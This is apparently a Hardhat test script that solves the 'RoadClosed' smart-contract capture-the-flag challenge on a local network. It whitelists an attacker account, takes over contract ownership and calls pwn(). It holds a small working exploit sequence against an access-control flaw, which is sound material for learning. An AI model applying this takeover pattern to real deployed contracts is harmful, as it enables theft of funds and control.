import { expect } from "chai";
import { ethers, network } from "hardhat";
import {utils} from "ethers";

describe("RoadClosed Test", function () {
    it("Should hack CTF", async function () {
        const [OWNER, HACKER] = await ethers.getSigners();
        const RoadClosed = await ethers.getContractFactory("RoadClosed");
        const roadClosed = await RoadClosed.deploy();
        await roadClosed.deployed();

        await roadClosed.addToWhitelist(HACKER.address);
        await roadClosed.connect(HACKER).changeOwner(HACKER.address);
        await roadClosed.connect(HACKER)["pwn(address)"](HACKER.address);
        console.log(await roadClosed.isHacked());
    });
});